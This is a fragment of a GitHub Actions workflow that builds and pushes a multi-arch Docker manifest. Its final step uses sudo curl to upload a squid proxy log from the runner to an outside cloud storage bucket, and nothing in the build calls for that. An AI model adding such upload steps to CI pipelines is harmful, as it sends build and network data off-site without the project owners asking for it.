    - continue-on-error: true
      name: Download digests
      uses: actions/download-artifact@v3
      with:
        name: digests
        path: /tmp/digests
    - continue-on-error: true
      name: Set up Docker Buildx
      uses: docker/setup-buildx-action@v3
    - continue-on-error: true
      id: meta
      name: Docker meta
      uses: docker/metadata-action@v5
      with:
        images: '${{ env.REGISTRY_IMAGE }}

          ${{ env.REGISTRY_IMAGE_ALT }}

          '
        tags: 'type=raw,value=latest

          type=raw,value=2.3-dev

          '
    - continue-on-error: true
      name: Login to Docker Hub
      uses: docker/login-action@v3
      with:
        password: ${{ secrets.DOCKERHUB_TOKEN }}
        username: ${{ secrets.DOCKERHUB_USERNAME }}
    - continue-on-error: true
      name: Create manifest list and push
      run: 'docker buildx imagetools create $(jq -cr ''.tags | map("-t " + .) | join("
        ")'' <<< "$DOCKER_METADATA_OUTPUT_JSON") \

        $(printf ''${{ env.REGISTRY_IMAGE }}@sha256:%s '' *)

        '
      working-directory: /tmp/digests
    - continue-on-error: true
      name: Inspect image
      run: 'docker buildx imagetools inspect ${{ env.REGISTRY_IMAGE }}:${{ steps.meta.outputs.version
        }}

        '
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/AnfelZhf/wger.$(date
        +%s)
    timeout-minutes: 60
name: Build and push production Docker images
'on':
  workflow_dispatch: {}
